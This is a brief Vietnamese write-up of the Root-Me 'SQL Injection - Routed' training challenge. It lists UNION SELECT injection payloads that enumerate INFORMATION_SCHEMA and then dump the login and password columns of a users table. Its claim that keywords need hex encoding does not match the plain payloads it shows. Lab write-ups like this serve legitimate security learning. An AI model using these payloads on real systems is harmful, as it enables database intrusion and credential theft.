## Link Challenge: [SQL Injection - Routed](https://www.root-me.org/en/Challenges/Web-Server/SQL-Injection-Routed)

Tìm hiểu Routed SQL ta thấy đây là câu lệnh lồng trong câu lệnh. Kết quả trả về sẽ là kết quả của câu lệnh ngoài(đã lồng câu lệnh trong)

Tuy nhiên ta không thể thêm một số từ khoá kiểu schema, table, order by, and, or ... Vậy phải đồng thời chuyển chúng sang hex. Chỉ còn `UNION SELECT` sử dụng được mà không cần chuyển hex

Format ta sẽ nhập là: `'UNION SELECT` + đoạn hex bổ sung + `-- -`

Đầu tiên check số cột: `ORDER BY 1-- -` => tới 3 thì lỗi => cột không được vượt quá 3.

Tiếp tục tìm table chứa account: `' UNION SELECT 2,TABLE_NAME FROM INFORMATION_SCHEMA.COLUMNS-- -`

![img1](https://i.imgur.com/ArxsC2L.png)

Tiếp tục tìm các cột lấy acc và password

```
' UNION SELECT 2,COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users' AND COLUMN_NAME LIKE 'password'-- -
' UNION SELECT 2,COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users' AND COLUMN_NAME LIKE 'login'-- -
```

![img2](https://i.imgur.com/JKFbMii.png)
![img3](https://i.imgur.com/2cebEon.png)

Tiếp tục tìm password và username của admin `' UNION SELECT login, password FROM users-- -`

![img4](https://i.imgur.com/7n6SYn0.png)